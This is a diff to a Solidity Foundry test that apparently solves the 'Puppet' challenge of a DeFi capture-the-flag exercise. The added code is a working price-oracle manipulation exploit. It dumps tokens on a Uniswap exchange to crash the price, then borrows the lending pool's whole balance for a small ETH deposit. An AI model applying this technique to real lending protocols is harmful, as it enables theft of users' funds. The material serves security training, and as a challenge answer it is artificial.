@@ -116,10 +116,19 @@ contract Puppet is Test {
 
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
-
+    // forge test --match-contract Puppet 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        // approve uniswap to transfer  attacker's tokens
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+        // trade dvt -> eth to dump price of tokens.                        1 wei to bypass 0 check.
+        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, block.timestamp + 1 hours);
+        // calculate how much deposit needed to borrow all the tokens.
+        uint256 amt = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        // borrow all the tokens for only ~19.66 eth instead of 10,000x the amount.
+        puppetPool.borrow{value: amt}(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
